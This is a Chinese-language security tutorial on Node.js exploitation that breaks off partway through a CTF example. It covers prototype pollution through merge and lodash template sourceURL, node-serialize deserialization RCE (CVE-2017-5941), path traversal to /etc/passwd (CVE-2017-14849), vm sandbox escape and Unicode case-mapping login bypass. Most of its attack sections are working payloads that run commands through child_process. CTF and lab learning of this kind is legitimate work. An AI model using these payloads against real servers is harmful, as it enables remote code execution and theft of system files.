&#x5173;&#x4E8E;&#x539F;&#x578B;&#x94FE;&#x6587;&#x7AE0;&#x5185;&#x5173;&#x4E8E;&#x539F;&#x578B;&#x548C;&#x539F;&#x578B;&#x94FE;&#x7684;&#x77E5;&#x8BC6;&#x5199;&#x7684;&#x975E;&#x5E38;&#x8BE6;&#x7EC6;&#xFF0C;&#x5C31;&#x4E0D;&#x518D;&#x603B;&#x7ED3;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x4E86;&#xFF0C;&#x4EE5;&#x4E0B;&#x4E3A;&#x51E0;&#x4E2A;&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x70B9;&#xFF1A; &#x5728;javascript&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x90FD;&#x6709;&#x4E00;&#x4E2A;prototype&#x5C5E;&#x6027;&#xFF0C;prototype &#x5C5E;&#x6027;&#x53EF;&#x4EE5;&#x5411;&#x5BF9;&#x8C61;&#x6DFB;&#x52A0;&#x5C5E;&#x6027;&#x548C;&#x65B9;&#x6CD5;&#x3002; &#x4F8B;&#x5B50;&#xFF1A; 1object.prototype.name=value &#x5728;javascript&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x90FD;&#x6709;&#x4E00;&#x4E2A;__proto__&#x5C5E;&#x6027;&#xFF0C;&#x8FD9;&#x4E2A;&#x5B9E;&#x4F8B;&#x5C5E;&#x6027;&#x6307;&#x5411;&#x5BF9;&#x8C61;&#x7684;&#x539F;&#x578B;&#x5BF9;&#x8C61;(&#x5373;&#x539F;&#x578B;)&#x3002;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x65B9;&#x5F0F;&#x8BBF;&#x95EE;&#x5F97;&#x5230;&#x67D0;&#x4E00;&#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x7684;&#x539F;&#x578B;&#x5BF9;&#x8C61;&#xFF1A; 123objectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype &#x4E0D;&#x540C;&#x5BF9;&#x8C61;&#x6240;&#x751F;&#x6210;&#x7684;&#x539F;&#x578B;&#x94FE;&#x5982;&#x4E0B;(&#x90E8;&#x5206;)&#xFF1A; 12345678910111213141516var o = {a: 1};// o&#x5BF9;&#x8C61;&#x76F4;&#x63A5;&#x7EE7;&#x627F;&#x4E86;Object.prototype// &#x539F;&#x578B;&#x94FE;&#xFF1A;// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// &#x6570;&#x7EC4;&#x90FD;&#x7EE7;&#x627F;&#x4E8E; Array.prototype// &#x539F;&#x578B;&#x94FE;&#xFF1A;// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f(){ return 2;}// &#x51FD;&#x6570;&#x90FD;&#x7EE7;&#x627F;&#x4E8E; Function.prototype// &#x539F;&#x578B;&#x94FE;&#xFF1A;// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null &#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x539F;&#x7406;&#x5BF9;&#x4E8E;&#x8BED;&#x53E5;&#xFF1A;object[a][b] = value &#x5982;&#x679C;&#x53EF;&#x4EE5;&#x63A7;&#x5236;a&#x3001;b&#x3001;value&#x7684;&#x503C;&#xFF0C;&#x5C06;a&#x8BBE;&#x7F6E;&#x4E3A;__proto__&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x7ED9;object&#x5BF9;&#x8C61;&#x7684;&#x539F;&#x578B;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;b&#x5C5E;&#x6027;&#xFF0C;&#x503C;&#x4E3A;value&#x3002;&#x8FD9;&#x6837;&#x6240;&#x6709;&#x7EE7;&#x627F;object&#x5BF9;&#x8C61;&#x539F;&#x578B;&#x7684;&#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x5728;&#x672C;&#x8EAB;&#x4E0D;&#x62E5;&#x6709;b&#x5C5E;&#x6027;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x90FD;&#x4F1A;&#x62E5;&#x6709;b&#x5C5E;&#x6027;&#xFF0C;&#x4E14;&#x503C;&#x4E3A;value&#x3002; &#x6765;&#x770B;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#xFF1A; 12345object1 = {&quot;a&quot;:1, &quot;b&quot;:2};object1.__proto__.foo = &quot;Hello World&quot;;console.log(object1.foo);object2 = {&quot;c&quot;:1, &quot;d&quot;:2};console.log(object2.foo); &#x6700;&#x7EC8;&#x4F1A;&#x8F93;&#x51FA;&#x4E24;&#x4E2A;Hello World&#x3002;&#x4E3A;&#x4EC0;&#x4E48;object2&#x5728;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;foo&#x5C5E;&#x6027;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4E5F;&#x4F1A;&#x8F93;&#x51FA;Hello World&#x5462;&#xFF1F;&#x5C31;&#x662F;&#x56E0;&#x4E3A;&#x5728;&#x7B2C;&#x4E8C;&#x6761;&#x8BED;&#x53E5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5BF9;object1&#x7684;&#x539F;&#x578B;&#x5BF9;&#x8C61;&#x8BBE;&#x7F6E;&#x4E86;&#x4E00;&#x4E2A;foo&#x5C5E;&#x6027;&#xFF0C;&#x800C;object2&#x548C;object1&#x4E00;&#x6837;&#xFF0C;&#x90FD;&#x662F;&#x7EE7;&#x627F;&#x4E86;Object.prototype&#x3002;&#x5728;&#x83B7;&#x53D6;object2.foo&#x65F6;&#xFF0C;&#x7531;&#x4E8E;object2&#x672C;&#x8EAB;&#x4E0D;&#x5B58;&#x5728;foo&#x5C5E;&#x6027;&#xFF0C;&#x5C31;&#x4F1A;&#x5F80;&#x7236;&#x7C7B;Object.prototype&#x4E2D;&#x53BB;&#x5BFB;&#x627E;&#x3002;&#x8FD9;&#x5C31;&#x9020;&#x6210;&#x4E86;&#x4E00;&#x4E2A;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#xFF0C;&#x6240;&#x4EE5;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#x5982;&#x679C;&#x80FD;&#x591F;&#x63A7;&#x5236;&#x5E76;&#x4FEE;&#x6539;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x7684;&#x539F;&#x578B;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5F71;&#x54CD;&#x5230;&#x6240;&#x6709;&#x548C;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#x540C;&#x4E00;&#x4E2A;&#x539F;&#x578B;&#x7684;&#x5BF9;&#x8C61;&#x3002; merge&#x64CD;&#x4F5C;&#x5BFC;&#x81F4;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;merge&#x64CD;&#x4F5C;&#x662F;&#x6700;&#x5E38;&#x89C1;&#x53EF;&#x80FD;&#x63A7;&#x5236;&#x952E;&#x540D;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x4E5F;&#x6700;&#x80FD;&#x88AB;&#x539F;&#x578B;&#x94FE;&#x653B;&#x51FB;&#x3002; &#x7B80;&#x5355;&#x4F8B;&#x5B50;&#xFF1A; 1234567891011121314151617function merge(target, source) { for (let key in source) { if (key in source &amp;&amp; key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } }}let object1 = {}let object2 = JSON.parse(&apos;{&quot;a&quot;: 1, &quot;__proto__&quot;: {&quot;b&quot;: 2}}&apos;)merge(object1, object2)console.log(object1.a, object1.b)object3 = {}console.log(object3.b) &#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x70B9;&#x662F;&#xFF1A; &#x5728;JSON&#x89E3;&#x6790;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;__proto__&#x4F1A;&#x88AB;&#x8BA4;&#x4E3A;&#x662F;&#x4E00;&#x4E2A;&#x771F;&#x6B63;&#x7684;&#x201C;&#x952E;&#x540D;&#x201D;&#xFF0C;&#x800C;&#x4E0D;&#x4EE3;&#x8868;&#x201C;&#x539F;&#x578B;&#x201D;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x904D;&#x5386;object2&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x5B58;&#x5728;&#x8FD9;&#x4E2A;&#x952E;&#x3002; &#x6700;&#x7EC8;&#x8F93;&#x51FA;&#x7684;&#x7ED3;&#x679C;&#x4E3A;&#xFF1A; 121 22 &#x53EF;&#x89C1;object3&#x7684;b&#x662F;&#x4ECE;&#x539F;&#x578B;&#x4E2D;&#x83B7;&#x53D6;&#x5230;&#x7684;&#xFF0C;&#x8BF4;&#x660E;Object&#x5DF2;&#x7ECF;&#x88AB;&#x6C61;&#x67D3;&#x4E86;&#x3002; Code-Breaking 2018 Thejs&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x5DF2;&#x7ECF;&#x6709;&#x5F88;&#x591A;&#x7684;&#x5206;&#x6790;&#x6587;&#x7AE0;&#x4E86;&#xFF0C;&#x4F46;&#x56E0;&#x4E3A;&#x5B83;&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x5B66;&#x4E60;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x8FD8;&#x662F;&#x503C;&#x5F97;&#x81EA;&#x5DF1;&#x518D;&#x8FC7;&#x4E00;&#x904D;&#x3002; &#x9898;&#x76EE;&#x6E90;&#x7801;&#x4E0B;&#x8F7D;&#xFF1A;http://code-breaking.com/puzzle/9/ &#x76F4;&#x63A5;npm install&#x53EF;&#x4EE5;&#x628A;&#x9700;&#x8981;&#x7684;&#x6A21;&#x5757;&#x4E0B;&#x8F7D;&#x4E0B;&#x6765;&#x3002; server.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344const fs = require(&apos;fs&apos;)const express = require(&apos;express&apos;)const bodyParser = require(&apos;body-parser&apos;)const lodash = require(&apos;lodash&apos;)const session = require(&apos;express-session&apos;)const randomize = require(&apos;randomatic&apos;)const app = express()app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())app.use(&apos;/static&apos;, express.static(&apos;static&apos;))app.use(session({ name: &apos;thejs.session&apos;, secret: randomize(&apos;aA0&apos;, 16), resave: false, saveUninitialized: false}))app.engine(&apos;ejs&apos;, function (filePath, options, callback) { // define the template engine fs.readFile(filePath, (err, content) =&gt; { if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled({...options}) return callback(null, rendered) })})app.set(&apos;views&apos;, &apos;./views&apos;)app.set(&apos;view engine&apos;, &apos;ejs&apos;)app.all(&apos;/&apos;, (req, res) =&gt; { // &#x5B9A;&#x4E49;session let data = req.session.data || {language: [], category: []} if (req.method == &apos;POST&apos;) { // &#x83B7;&#x53D6;post&#x6570;&#x636E;&#x5E76;&#x5408;&#x5E76; data = lodash.merge(data, req.body) req.session.data = data // &#x518D;&#x5C06;data&#x8D4B;&#x503C;&#x7ED9;session } res.render(&apos;index&apos;, { language: data.language, category: data.category })})app.listen(3000, () =&gt; console.log(&apos;Example app listening on port 3000!&apos;)) &#x95EE;&#x9898;&#x51FA;&#x5728;&#x4E86;lodashs.merge&#x51FD;&#x6570;&#x8FD9;&#x91CC;&#xFF0C;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5B58;&#x5728;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x6F0F;&#x6D1E;&#x3002;&#x4F46;&#x662F;&#x5149;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x8FD8;&#x4E0D;&#x884C;&#xFF0C;&#x6211;&#x4EEC;&#x5F97;&#x5BFB;&#x627E;&#x5230;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x70B9;&#x3002;&#x56E0;&#x4E3A;&#x901A;&#x8FC7;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x67D0;&#x4E00;&#x79CD;&#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x539F;&#x578B;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x53BB;&#x5BFB;&#x627E;&#x4E00;&#x4E2A;&#x53EF;&#x4EE5;&#x88AB;&#x5229;&#x7528;&#x7684;&#x5C5E;&#x6027;&#x3002; &#x9875;&#x9762;&#x6700;&#x7EC8;&#x4F1A;&#x901A;&#x8FC7;lodash.template&#x8FDB;&#x884C;&#x6E32;&#x67D3;&#xFF0C;&#x8DDF;&#x8E2A;&#x5230;lodash/template.js&#x4E2D;&#x3002; &#x5982;&#x56FE;&#x53EF;&#x4EE5;&#x770B;&#x5230;options&#x662F;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;sourceURL&#x662F;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x7684;&#x8BED;&#x53E5;&#x8D4B;&#x503C;&#x7684;&#xFF0C;options&#x9ED8;&#x8BA4;&#x6CA1;&#x6709;sourceURL&#x5C5E;&#x6027;&#xFF0C;&#x6240;&#x4EE5;sourceURL&#x9ED8;&#x8BA4;&#x4E5F;&#x662F;&#x4E3A;&#x7A7A;&#x3002; 1var sourceURL = &apos;sourceURL&apos; in options ? &apos;//# sourceURL=&apos; + options.sourceURL + &apos;\\n&apos; : &apos;&apos;; &#x5982;&#x679C;&#x6211;&#x4EEC;&#x80FD;&#x591F;&#x7ED9;options&#x7684;&#x539F;&#x578B;&#x5BF9;&#x8C61;&#x52A0;&#x4E00;&#x4E2A;sourceURL&#x5C5E;&#x6027;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x63A7;&#x5236;sourceURL&#x7684;&#x503C;&#x3002; &#x7EE7;&#x7EED;&#x5F80;&#x4E0B;&#x9762;&#x770B;&#xFF0C;&#x6700;&#x540E;sourceURL&#x4F20;&#x9012;&#x5230;&#x4E86;Function&#x51FD;&#x6570;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x5F53;&#x4E2D;&#xFF1A; 1234var result = attempt(function() { return Function(importsKeys, sourceURL + &apos;return &apos; + source) .apply(undefined, importsValues);}); &#x901A;&#x8FC7;&#x6784;&#x9020;chile_process.exec()&#x5C31;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x4E86;&#x3002; &#x6700;&#x7EC8;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;Payload&#x4F5C;&#x4E3A;&#x4F20;&#x9012;&#x7ED9;&#x4E3B;&#x9875;&#x9762;&#x7684;&#x7684;POST&#x6570;&#x636E;(windows&#x8C03;&#x7528;&#x8BA1;&#x7B97;&#x5668;)&#xFF1A; 1{&quot;__proto__&quot;:{&quot;sourceURL&quot;:&quot;\\nglobal.process.mainModule.constructor._load(&apos;child_process&apos;).exec(&apos;calc&apos;)//&quot;}} (&#x8FD9;&#x91CC;&#x76F4;&#x63A5;&#x7528;require&#x4F1A;&#x62A5;&#x9519;&#xFF1A;ReferenceError: require is not defined p&#x795E;&#x7ED9;&#x4E86;&#x4E00;&#x4E2A;&#x66F4;&#x597D;&#x7684;payload&#xFF1A; 1{&quot;__proto__&quot;:{&quot;sourceURL&quot;:&quot;\\nreturn e=&gt; {for (var a in {}) {delete Object.prototype[a];} return global.process.mainModule.constructor._load(&apos;child_process&apos;).execSync(&apos;id&apos;)}\\n//&quot;}} node-serialize&#x53CD;&#x5E8F;&#x5217;&#x5316;RCE&#x6F0F;&#x6D1E;(CVE-2017-5941)&#x6F0F;&#x6D1E;&#x51FA;&#x73B0;&#x5728;node-serialize&#x6A21;&#x5757;0.0.4&#x7248;&#x672C;&#x5F53;&#x4E2D;&#xFF0C;&#x4F7F;&#x7528;npm install node-serialize@0.0.4&#x5B89;&#x88C5;&#x6A21;&#x5757;&#x3002; &#x4E86;&#x89E3;&#x4EC0;&#x4E48;&#x662F;IIFE&#xFF1A; IIFE&#xFF08;&#x7ACB;&#x5373;&#x8C03;&#x7528;&#x51FD;&#x6570;&#x8868;&#x8FBE;&#x5F0F;&#xFF09;&#x662F;&#x4E00;&#x4E2A;&#x5728;&#x5B9A;&#x4E49;&#x65F6;&#x5C31;&#x4F1A;&#x7ACB;&#x5373;&#x6267;&#x884C;&#x7684; JavaScript &#x51FD;&#x6570;&#x3002; IIFE&#x4E00;&#x822C;&#x5199;&#x6210;&#x4E0B;&#x9762;&#x7684;&#x5F62;&#x5F0F;&#xFF1A; 123(function(){ /* code */ }());// &#x6216;&#x8005;(function(){ /* code */ })(); `node-serialize@0.0.4`&#x6F0F;&#x6D1E;&#x70B9; &#x6F0F;&#x6D1E;&#x4EE3;&#x7801;&#x4F4D;&#x4E8E;node_modules\\node-serialize\\lib\\serialize.js&#x4E2D;&#xFF1A; &#x5176;&#x4E2D;&#x7684;&#x5173;&#x952E;&#x5C31;&#x662F;&#xFF1A;obj[key] = eval(&apos;(&apos; + obj[key].substring(FUNCFLAG.length) + &apos;)&apos;);&#x8FD9;&#x4E00;&#x884C;&#x8BED;&#x53E5;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4F20;&#x9012;&#x7ED9;eval&#x7684;&#x53C2;&#x6570;&#x662F;&#x7528;&#x62EC;&#x53F7;&#x5305;&#x88F9;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x6784;&#x9020;&#x4E00;&#x4E2A;function(){}()&#x51FD;&#x6570;&#xFF0C;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5C31;&#x4F1A;&#x88AB;&#x5F53;&#x4E2D;IIFE&#x7ACB;&#x5373;&#x8C03;&#x7528;&#x6267;&#x884C;&#x3002;&#x6765;&#x770B;&#x5982;&#x4F55;&#x6784;&#x9020;payload&#xFF1A; &#x6784;&#x9020;Payload 12345serialize = require(&apos;node-serialize&apos;);var test = { rce : function(){require(&apos;child_process&apos;).exec(&apos;ls /&apos;,function(error, stdout, stderr){console.log(stdout)});},}console.log(&quot;&#x5E8F;&#x5217;&#x5316;&#x751F;&#x6210;&#x7684; Payload: \\n&quot; + serialize.serialize(test)); &#x751F;&#x6210;&#x7684;Payload&#x4E3A;&#xFF1A; {&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){require(&apos;child_process&apos;).exec(&apos;ls /&apos;,function(error, stdout, stderr){console.log(stdout)});}&quot;} &#x56E0;&#x4E3A;&#x9700;&#x8981;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x8BA9;&#x5176;&#x7ACB;&#x5373;&#x8C03;&#x7528;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728;&#x751F;&#x6210;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x8BED;&#x53E5;&#x7684;&#x51FD;&#x6570;&#x540E;&#x9762;&#x518D;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;()&#xFF0C;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A; {&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){require(&apos;child_process&apos;).exec(&apos;ls /&apos;,function(error, stdout, stderr){console.log(stdout)});}()&quot;} (&#x8FD9;&#x91CC;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x5728;&#x5BF9;&#x8C61;&#x5185;&#x5B9A;&#x4E49;IIFE&#x8868;&#x8FBE;&#x5F0F;&#xFF0C;&#x4E0D;&#x7136;&#x4F1A;&#x5E8F;&#x5217;&#x5316;&#x5931;&#x8D25;) &#x4F20;&#x9012;&#x7ED9;unserialize(&#x6CE8;&#x610F;&#x8F6C;&#x4E49;&#x5355;&#x5F15;&#x53F7;)&#xFF1A; 123var serialize = require(&apos;node-serialize&apos;);var payload = &apos;{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){require(\\&apos;child_process\\&apos;).exec(\\&apos;ls /\\&apos;,function(error, stdout, stderr){console.log(stdout)});}()&quot;}&apos;;serialize.unserialize(payload); &#x6267;&#x884C;&#x547D;&#x4EE4;&#x6210;&#x529F;&#xFF0C;&#x7ED3;&#x679C;&#x5982;&#x56FE;&#xFF1A; Node.js &#x76EE;&#x5F55;&#x7A7F;&#x8D8A;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;(CVE-2017-14849)&#x5728;vulhub&#x4E0A;&#x9762;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4E0B;&#x8F7D;&#x5230;&#x73AF;&#x5883;&#x3002; &#x6F0F;&#x6D1E;&#x5F71;&#x54CD;&#x7684;&#x7248;&#x672C;&#xFF1A; Node.js 8.5.0 + Express 3.19.0-3.21.2 Node.js 8.5.0 + Express 4.11.0-4.15.5 &#x8FD0;&#x884C;&#x6F0F;&#x6D1E;&#x73AF;&#x5883;&#xFF1A; 123cd vulhub/node/CVE-2017-14849/docker-compose builddocker-compose up -d &#x7528;Burpsuite&#x83B7;&#x53D6;&#x5730;&#x5740;&#xFF1A;/static/../../../a/../../../../etc/passwd &#x5373;&#x53EF;&#x4E0B;&#x8F7D;&#x5F97;&#x5230;/etc/passwd&#x6587;&#x4EF6; &#x5177;&#x4F53;&#x5206;&#x6790;&#x53EF;&#x89C1;&#xFF1A;Node.js CVE-2017-14849 &#x6F0F;&#x6D1E;&#x5206;&#x6790; vm&#x6C99;&#x7BB1;&#x9003;&#x9038;vm&#x662F;&#x7528;&#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E2A;&#x6C99;&#x7BB1;&#x73AF;&#x5883;&#xFF0C;&#x53EF;&#x4EE5;&#x5B89;&#x5168;&#x7684;&#x6267;&#x884C;&#x4E0D;&#x53D7;&#x4FE1;&#x4EFB;&#x7684;&#x4EE3;&#x7801;&#x800C;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x5230;&#x4E3B;&#x7A0B;&#x5E8F;&#x3002;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x8BED;&#x53E5;&#x6765;&#x8FDB;&#x884C;&#x9003;&#x9038;&#xFF1A; &#x9003;&#x9038;&#x4F8B;&#x5B50;&#xFF1A; 123const vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`this.constructor.constructor(&apos;return this.process.env&apos;)()`);console.log(env); &#x6267;&#x884C;&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#x4E3B;&#x7A0B;&#x5E8F;&#x73AF;&#x5883;&#x4E2D;&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF; &#x4E0A;&#x9762;&#x4F8B;&#x5B50;&#x7684;&#x4EE3;&#x7801;&#x7B49;&#x4EF7;&#x4E8E;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A; 123456const vm = require(&apos;vm&apos;);const sandbox = {};const script = new vm.Script(&quot;this.constructor.constructor(&apos;return this.process.env&apos;)()&quot;);const context = vm.createContext(sandbox);env = script.runInContext(context);console.log(env); &#x521B;&#x5EFA;vm&#x73AF;&#x5883;&#x65F6;&#xFF0C;&#x9996;&#x5148;&#x8981;&#x521D;&#x59CB;&#x5316;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61; sandbox&#xFF0C;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#x5C31;&#x662F;vm&#x4E2D;&#x811A;&#x672C;&#x6267;&#x884C;&#x65F6;&#x7684;&#x5168;&#x5C40;&#x73AF;&#x5883;context&#xFF0C;vm &#x811A;&#x672C;&#x4E2D;&#x5168;&#x5C40; this &#x6307;&#x5411;&#x7684;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#x3002; &#x56E0;&#x4E3A;this.constructor.constructor&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x4E00;&#x4E2A;Function constructor&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5229;&#x7528;Function&#x5BF9;&#x8C61;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x5E76;&#x6267;&#x884C;&#x3002;(&#x6B64;&#x65F6;Function&#x5BF9;&#x8C61;&#x7684;&#x4E0A;&#x4E0B;&#x6587;&#x73AF;&#x5883;&#x662F;&#x5904;&#x4E8E;&#x4E3B;&#x7A0B;&#x5E8F;&#x4E2D;&#x7684;) &#x8FD9;&#x91CC;&#x6784;&#x9020;&#x7684;&#x51FD;&#x6570;&#x5185;&#x7684;&#x8BED;&#x53E5;&#x662F;return this.process.env&#xFF0C;&#x7ED3;&#x679C;&#x662F;&#x8FD4;&#x56DE;&#x4E86;&#x4E3B;&#x7A0B;&#x5E8F;&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x3002; &#x914D;&#x5408;chile_process.exec()&#x5C31;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x547D;&#x4EE4;&#x4E86;&#xFF1A; 1234const vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`const process = this.constructor.constructor(&apos;return this.process&apos;)();process.mainModule.require(&apos;child_process&apos;).execSync(&apos;whoami&apos;).toString()`);console.log(env); &#x6700;&#x8FD1;&#x7684;mongo-express RCE(CVE-2019-10758)&#x6F0F;&#x6D1E;&#x5C31;&#x662F;&#x914D;&#x5408;vm&#x6C99;&#x7BB1;&#x9003;&#x9038;&#x6765;&#x5229;&#x7528;&#x7684;&#x3002; &#x5177;&#x4F53;&#x5206;&#x6790;&#x53EF;&#x53C2;&#x8003;&#xFF1A;CVE-2019-10758:mongo-expressRCE&#x590D;&#x73B0;&#x5206;&#x6790; javascript&#x5927;&#x5C0F;&#x5199;&#x7279;&#x6027;&#x5728;javascript&#x4E2D;&#x6709;&#x51E0;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x5B57;&#x7B26;&#x9700;&#x8981;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B; &#x5BF9;&#x4E8E;toUpperCase(): &#x5B57;&#x7B26;&quot;&#x131;&quot;&#x3001;&quot;&#x17F;&quot; &#x7ECF;&#x8FC7;toUpperCase&#x5904;&#x7406;&#x540E;&#x7ED3;&#x679C;&#x4E3A; &quot;I&quot;&#x3001;&quot;S&quot; &#x5BF9;&#x4E8E;toLowerCase(): &#x5B57;&#x7B26;&quot;&#x212A;&quot;&#x7ECF;&#x8FC7;toLowerCase&#x5904;&#x7406;&#x540E;&#x7ED3;&#x679C;&#x4E3A;&quot;k&quot;(&#x8FD9;&#x4E2A;&#x212A;&#x4E0D;&#x662F;K) &#x5728;&#x7ED5;&#x4E00;&#x4E9B;&#x89C4;&#x5219;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x51E0;&#x4E2A;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7; CTF&#x9898;&#x5B9E;&#x4F8B; - Hacktm&#x4E2D;&#x7684;&#x4E00;&#x9053;Nodejs&#x9898; &#x9898;&#x76EE;&#x90E8;&#x5206;&#x6E90;&#x7801;&#xFF1A; 12345678910function isValidUser(u) { return ( u.username.length &gt;= 3 &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toUpperCase() );}function isAdmin(u) { return u.username.toLowerCase() == config.adminUsername.toLowerCase();} &#x89E3;&#x9898;&#x65F6;&#x9700;&#x8981;&#x767B;&#x5F55;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x767B;&#x5F55;&#x65F6;&#xFF0C;isValidUser&#x51FD;&#x6570;&#x4F1A;&#x5BF9;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x7528;&#x6237;&#x540D;&#x8FDB;&#x884C;toUpperCase&#x5904;&#x7406;&#xFF0C;&#x518D;&#x4E0E;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;&#x540D;&#x8FDB;&#x884C;&#x5BF9;&#x6BD4;&#x3002;&#x5982;&#x679C;&#x8F93;&#x5165;&#x7684;&#x7528;&#x6237;&#x540D;&#x4E0E;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;&#x540D;&#x76F8;&#x540C;&#xFF0C;&#x5C31;&#x4E0D;&#x5141;&#x8BB8;&#x767B;&#x5F55;&#x3002; 